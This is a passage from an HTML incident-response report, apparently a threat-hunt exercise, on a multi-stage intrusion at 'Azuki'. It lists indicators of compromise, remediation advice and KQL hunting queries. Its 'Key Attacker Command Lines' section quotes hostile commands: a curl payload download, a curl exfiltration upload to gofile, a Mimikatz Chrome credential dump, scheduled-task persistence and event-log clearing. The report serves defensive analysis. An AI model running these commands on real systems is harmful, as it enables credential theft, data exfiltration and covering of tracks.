IP</th><th>Role</th></tr></thead><tbody><tr><td>litter.catbox.moe</td><td>Payload hosting (archive downloads)</td></tr><tr><td>108.181.20.36</td><td>Resolved IP — litter.catbox.moe (HTTPS/443)</td></tr><tr><td>store1.gofile.io</td><td>Exfiltration endpoint (form-based uploads)</td></tr><tr><td>45.112.123.227</td><td>Resolved IP — store1.gofile.io (HTTPS/443)</td></tr><tr><td>live.sysinternals.com</td><td>PsExec retrieval (legitimate, abused)</td></tr><tr><td>172.179.214.166</td><td>Resolved IP — live.sysinternals.com (HTTPS/443)</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">File / Tooling Indicators</div><div class="tbl-outer"><table><thead><tr><th>Filename</th><th>Path</th><th>SHA-256</th></tr></thead><tbody><tr><td>KB5044273-x64.7z</td><td>C:\Windows\Temp\cache\</td><td>c8ff861a52e85c9bfa2735f16c9f428c9de446e7295f2c5d3e6c194a4d322fb2</td></tr><tr><td>meterpreter.exe</td><td>C:\Windows\Temp\cache\</td><td>24373ce25d981b2b9b1d1e8390b2122f7557118f4c9c74096bcfb1bd60b9bb83</td></tr><tr><td>m-temp.7z</td><td>C:\Windows\Temp\cache\</td><td>8e5bd50f4db7b6114232defb471d32b17e117fccc4fa36d467531e4b5c2102ef</td></tr><tr><td>m.exe</td><td>C:\Windows\Temp\cache\</td><td>61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1</td></tr><tr><td>chrome-credentials.tar.gz</td><td>C:\Windows\Temp\cache\</td><td>664af795cbb5f7f1a57d8fe537c1aa1fc56b9d7ed0e6d2cc139d57127b6631e1</td></tr><tr><td>chrome-session-theft.tar.gz</td><td>C:\Windows\Temp\cache\</td><td>b5dcae00375318ab3c31c59a67a8d25eaa14c173da1783951a9f82bb0ae7dbe4</td></tr><tr><td>PsExec64.exe</td><td>C:\Windows\Temp\cache\</td><td>edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef</td></tr><tr><td>silentlynx.exe</td><td>C:\Windows\Temp\cache\ + ADMIN$ copies</td><td>ba9ee9747a60b34e6099ceb2f51a95b748a4f34d2114b5171756e8ae55f688ec</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Persistence / Behavioural Indicators</div><ul class="bl"><li>Scheduled task: <code>Microsoft\Windows\Security\SecurityHealthService</code> (onlogon, highest privileges) executing <code>C:\Windows\Temp\cache\silentlynx.exe</code></li><li>Named pipe: <code>\Device\NamedPipe\msf-pipe-5902</code></li><li>Backdoor local admin: yuki.tanaka2 (created and added to Administrators)</li></ul></div><div class="sub"><div class="sub-label">Key Attacker Command Lines (Selected)</div><ul class="bl"><li><code>where /r C:\Users *.kdbx</code></li><li><code>NETSTAT.EXE -ano</code></li><li><code>nltest.exe /domain_trusts /all_trusts</code></li><li><code>curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z</code></li><li><code>curl.exe -X POST -F <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="63050a0f065e2300110607060d170a020f104d1702114d0419">[email&#160;protected]</a> https://store1.gofile.io/uploadFile</code></li><li><code>m.exe privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit</code></li><li><code>schtasks /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f</code></li><li><code>wevtutil cl "Microsoft-Windows-PowerShell/Operational"</code></li><li><code>wevtutil.exe cl "Windows PowerShell"</code></li><li><code>robocopy.exe /s /r:3 /w:5 "C:\Users\yuki.tanaka\Documents\Banking" "C:\ProgramData\Microsoft\Crypto\staging\Banking"</code></li><li><code>tar.exe -czf credentials.tar.gz Master-Passwords.kdbx KeePass-Master-Password.txt</code></li><li><code>tar.exe -czf banking-records.tar.gz Banking</code></li></ul></div></div>
+</div>
+<div class="section" id="recs">
+<div class="section-header">
+  <span class="sh-num">11</span>
+  <span class="sh-title">RECOMMENDATIONS</span>
+</div>
+<div class="section-body"><div class="rec-grp"><span class="rec-badge rb-now">Immediate</span><ul class="bl"><li>Isolate azuki-adminpc immediately; block outbound connections to litter.catbox.moe and store1.gofile.io at egress controls; temporarily block associated IPs pending validation.</li><li>Force-reset passwords for yuki.tanaka, kenji.sato, fileadmin, and any other accounts used from azuki-adminpc; invalidate browser sessions where feasible; rotate any credentials stored in KeePass affected by the exposed master password.</li><li>Remove the backdoor account yuki.tanaka2; delete the scheduled task <code>Microsoft\Windows\Security\SecurityHealthService</code>; hunt for additional scheduled tasks/services/autoruns created during the window.</li><li>Remove malicious binaries and archives from <code>C:\Windows\Temp\cache</code> and <code>C:\ProgramData\Microsoft\Crypto\staging</code>; check for PsExec service artefacts (PSEXESVC) and ADMIN$ drop traces on 10.1.0.188 and 10.1.0.204.</li></ul></div><div class="rec-grp"><span class="rec-badge rb-short">Short-Term (24–48 Hours)</span><ul class="bl"><li>Alert on curl.exe executing external downloads/uploads, tar/7z used in Temp directories, Mimikatz command-line patterns (dpapi::chrome), wevtutil log clears, and new local admin creation (<code>net user /add</code> + <code>localgroup Administrators</code>).</li><li>Hunt enterprise-wide for the named pipe pattern <code>msf-pipe-</code> and for the staging path <code>C:\ProgramData\Microsoft\Crypto\staging</code>.</li><li>Review sign-in logs for yuki.tanaka and yuki.tanaka2 across all reachable systems.</li></ul></div><div class="rec-grp"><span class="rec-badge rb-long">Long-Term (1–4 Weeks)</span><ul class="bl"><li>Perform full memory and disk acquisition from azuki-adminpc where available.</li><li>Implement EDR with behavioural analysis to detect DPAPI abuse and named pipe C2 patterns.</li><li>Restrict ADMIN$ share access and monitor for PsExec-style remote service creation on internal hosts.</li><li>Enforce MFA for all privileged and remote access accounts to limit credential reuse risk.</li></ul></div></div>
+</div>
+<div class="section" id="kql">
+<div class="section-header">
+  <span class="sh-num">12</span>
+  <span class="sh-title">KQL QUERIES</span>
+</div>
+<div class="section-body"><div class="kql">
+<div class="kql-hd"><b>Q01</b> — Successful logons across Azuki hosts (entry + pivots)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-12-01))
+| where DeviceName has "azuki"
+| where ActionType == "LogonSuccess"
+| where LogonType in ("RemoteInteractive", "Network")
+| summarize
+    FirstSeen=min(TimeGenerated),
+    LastSeen=max(TimeGenerated),
+    Logons=count()
+  by DeviceName, AccountName, LogonType, RemoteIP, RemoteIPType
+| order by FirstSeen asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q02</b> — Map internal IPs to devices (quick identity pivot)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceNetworkEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-25))
+| where LocalIP in ("10.0.8.4","10.0.8.9","10.1.0.204","10.1.0.188")
+| project TimeGenerated, DeviceName, LocalIP
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q03</b> — High-signal process activity on azuki-adminpc</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has_any ("powershell", "certutil", "curl", "schtasks", "wevtutil",
+    "nltest", "netstat", "quser", "qwinsta", "where /r", "psexec", "7z", "tar", "m.exe")
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q04</b> — Tooling drops in Windows Temp cache</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where FolderPath has @"C:\Windows\Temp\cache"
+| where FileName in ("KB5044273-x64.7z","m-temp.7z","m.exe","meterpreter.exe",
+    "silentlynx.exe","chrome-credentials.tar.gz","chrome-session-theft.tar.gz","PsExec64.exe")
+| project TimeGenerated, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q05</b> — Named pipe creation (C2/implant behavioural indicator)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceEvents
+| where TimeGenerated between (datetime(2025-11-25 04:00:00) .. datetime(2025-11-25 07:00:00))
+| where DeviceName == "azuki-adminpc"
+| where ActionType == "NamedPipeEvent"
+| extend PipeName = tostring(parse_json(AdditionalFields).PipeName)
+| project TimeGenerated, DeviceName, ActionType, PipeName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q06</b> — RDP session enumeration (interactive discovery)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has_any ("quser", "query user", "qwinsta", "query session")
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q07</b> — Domain trust enumeration (nltest)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has "nltest"
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q08</b> — Network connection enumeration (netstat -ano)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has "netstat"
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q09</b> — Password database search (KeePass .kdbx discovery)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has_any ("dir", "find", "findstr", "forfiles", "where /r")
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q10</b> — Desktop/Documents file activity (user data + creds-in-files)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where FolderPath has_any ("Desktop","Documents")
+| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q11</b> — Hunt for credential-file naming patterns under user profiles</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where FolderPath has @"C:\Users"
+| where FileName has_any ("pass", "password", "cred", "login", "account", "secret", "vpn", "bank", "keepass")
+| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q12</b> — Staging directory — archives prepared for exfil</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ActionType == "FileCreated"
+| where FolderPath startswith @"C:\ProgramData\Microsoft\Crypto\staging"
+| where FileName endswith ".zip" or FileName endswith ".7z" or FileName endswith ".tar.gz"
+| project TimeGenerated, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q13</b> — Collection movement into staging (robocopy)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has_any ("robocopy", "xcopy")
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q14</b> — Exfil commands (HTTP POST uploads) + download activity</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has_any ("curl.exe", "certutil", "http", "uploadFile", "-X POST", "-F file=@")
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q15</b> — Browser credential theft (m.exe / DPAPI chrome module)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has "m.exe"
+| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q16</b> — Exfil destination infrastructure (resolve RemoteIP for uploads)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceNetworkEvents
+| where TimeGenerated between (datetime(2025-11-25 04:00:00) .. datetime(2025-11-25 07:00:00))
+| where DeviceName == "azuki-adminpc"
+| where InitiatingProcessFileName in~ ("curl.exe", "powershell.exe")
+| project TimeGenerated, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
+| order by TimeGenerated asc</pre>
+</div></div><div class="kql">
+<div class="kql-hd"><b>Q17</b> — Master password file discovery (expanded window)</div>
+<div class="kql-wrap">
+  <div class="kql-bar"><div class="kql-dots"><i></i><i></i><i></i></div><span class="kql-tag">KQL</span></div>
+  <pre>DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-12-25))
+| where DeviceName == "azuki-adminpc"
+| where ActionType == "FileCreated"
+| where FileName endswith ".txt"
+| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc</pre>
+</div></div></div>
+</div>
+<div class="section" id="appendix">
+<div class="section-header">
+  <span class="sh-num">13</span>
+  <span class="sh-title">APPENDIX</span>
+</div>
+<div class="section-body"><div class="sub"><div class="sub-label">A — Staged Archives (Business Data)</div><p class="p">Staging directory: <code>C:\ProgramData\Microsoft\Crypto\staging</code></p><ul class="bl"><li><code>C:\ProgramData\Microsoft\Crypto\staging\credentials.tar.gz</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\quickbooks-data.tar.gz</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\banking-records.tar.gz</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\tax-documents.tar.gz</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\contracts-data.tar.gz</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\Contracts\Archive\All-Contracts-2022.zip</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\Contracts\Archive\All-Contracts-2023.zip</code></li><li><code>C:\ProgramData\Microsoft\Crypto\staging\Tax-Records\Tax-Supporting-Docs-2024.zip</code></li></ul></div><div class="sub"><div class="sub-label">B — Credential Artefacts Discovered</div><ul class="bl"><li>Password artefact (link): <code>OLD-Passwords.lnk</code></li><li>Plaintext master password file: <code>KeePass-Master-Password.txt</code></li></ul></div><div class="sub"><div class="sub-label">C — References</div><ul class="bl"><li><a href="https://attack.mitre.org/techniques/T1555/003/" style="color:var(--blue)">MITRE ATT&amp;CK — T1555.003 Credentials from Web Browsers</a></li><li><a href="https://attack.mitre.org/techniques/T1552/001/" style="color:var(--blue)">MITRE ATT&amp;CK — T1552.001 Unsecured Credentials: Credentials In Files</a></li><li><a href="https://attack.mitre.org/techniques/T1074/001/" style="color:var(--blue)">MITRE ATT&amp;CK — T1074.001 Data Staged: Local Data Staging</a></li><li><a href="https://attack.mitre.org/techniques/T1567/" style="color:var(--blue)">MITRE ATT&amp;CK — T1567 Exfiltration Over Web Service</a></li><li><a href="https://www.cisa.gov/news-events/news/choosing-and-protecting-passwords" style="color:var(--blue)">CISA — Choosing and Protecting Passwords</a></li></ul></div></div>
+</div>
+<div class="foot">
+  <span class="foot-conf">CONFIDENTIAL</span>
+  <span>Azuki — Multi-Stage Intrusion &amp; Data Exfiltration &nbsp;·&nbsp; Yousef Nabil &nbsp;·&nbsp; 2026-02-19</span>
+</div>
+</main>
+</div>
+
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+(function(){
+  const links = document.querySelectorAll('.nav-link');
+  const ids = Array.from(links).map(l=>l.getAttribute('href').slice(1));
+  const els = ids.map(id=>document.getElementById(id)).filter(Boolean);
+  function tick(){
+    const y = window.scrollY + 80;
+    let cur = els[0];
+    for(const e of els){
